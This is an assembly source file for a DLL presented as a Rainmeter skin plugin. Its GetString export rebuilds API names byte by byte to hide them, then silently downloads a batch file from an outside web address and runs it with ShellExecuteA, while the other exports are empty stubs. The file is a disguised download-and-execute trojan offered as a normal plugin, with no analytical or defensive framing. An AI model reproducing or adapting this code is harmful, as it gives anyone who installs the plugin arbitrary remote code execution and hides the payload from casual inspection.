; RAINMETER Plugin written in fasm (flatassembler.net) - ringi

format PE GUI 4.0 DLL ; x86 32bit
entry DllEntryPoint

include '../INCLUDE/win32a.inc'

section '.rm' code readable writeable executable

_test du 'a',0
_author du 'Hans Peter',0
_ver dd 1001d
UrlDownload rb 19d
dllurl rb 11d 
ShellExec rb 14d
Shell rb 14d
_dlstr db 'a.bat',0	
_urlstr db 'http://sensu.me/test.bat',0


proc DllEntryPoint hinstDLL,fdwReason,lpvReserved
    mov	eax,TRUE
    ret
endp

; VOID Initialize(HWND instance,DWORD iniFile,DWORD section,DWORD ID);
proc Initialize hWnd,iniFile,section,id
    mov eax,0
    ret
endp

; DWORD Update(DWORD id);
proc Update id
    mov eax,0
    ret
endp

; DWORD GetString(UINT id, UINT flags);
proc GetString id,flags

    mov dword [dllurl], 'UDLM'
    mov dword [dllurl+4d], 'ON.D'
    mov word [dllurl+8d], 'LL'
    mov byte [dllurl+1d], 'R'
    
    ; --------------------------- URLDOWNLOAD

    mov dword [Shell], 'SHEL'
    mov dword [Shell+4d], 'L32.'
    mov word [Shell+8d], 'DL'
    mov byte [Shell+10d], 'L'
    
    mov dword [UrlDownload], 'UROD'
    mov dword [UrlDownload+4d], 'ownl'
    mov dword [UrlDownload+8d], 'oadT'
    mov dword [UrlDownload+12d], 'oGil'
    mov word [UrlDownload+16d], 'eA'
    mov byte [UrlDownload+2d], 'L'
    mov byte [UrlDownload+13d], 'F'
    
    ;- Shellexecute
    mov dword [ShellExec], 'Shel'
    mov dword [ShellExec+4d], 'lExe'
    mov dword [ShellExec+8d], 'cute'
    mov byte [ShellExec+12d], 'A'
    
    ;------------------------------------------------Get Handle
    
    ;push dllurl				
    ;call [LoadLibraryA]
    invoke LoadLibraryA,dllurl
    
    ;-------------------------------------------------Get Addr	

    
    ;push UrlDownload
    ;push eax
    ;call [GetProcAddress]						
    invoke GetProcAddress,eax,UrlDownload
    
    ;--------------------------------------------------download file
    
    push 0
    push 0
    push _dlstr
    push _urlstr
    push 0
    call eax

    
    ;-------------------------------------------------execute
    
    push Shell
    call [LoadLibraryA]
    
    ;push ShellExec
    ;push eax
    ;call [GetProcAddress]
    invoke GetProcAddress,eax,ShellExec	
        
    push 1
    push 0
    push 0
    push _dlstr
    push 0
    push 0
    call eax

    
    mov eax,_test
    ret
endp

; DWORD GetPluginVersion();
proc GetPluginVersion
    mov eax,_ver
    ret
endp

; DWORD GetPluginAuthor();
proc GetPluginAuthor
    mov eax,_author
    ret
endp

; VOID Finalize();
proc Finalize instance,id
    mov eax,TRUE
    ret
endp

section '.idata' import data readable writeable

 library kernel32,'KERNEL32.DLL'

 import kernel32,\
        LoadLibraryA,'LoadLibraryA',\
        GetProcAddress,'GetProcAddress'
     
section '.edata' export data readable

  export 'RM32.DLL',\
     Initialize,'Initialize',\
     Finalize,'Finalize',\
     Update,'Update',\
     GetString,'GetString',\
     GetPluginAuthor,'GetPluginAuthor',\
     GetPluginVersion,'GetPluginVersion'

section '.reloc' fixups data discardable
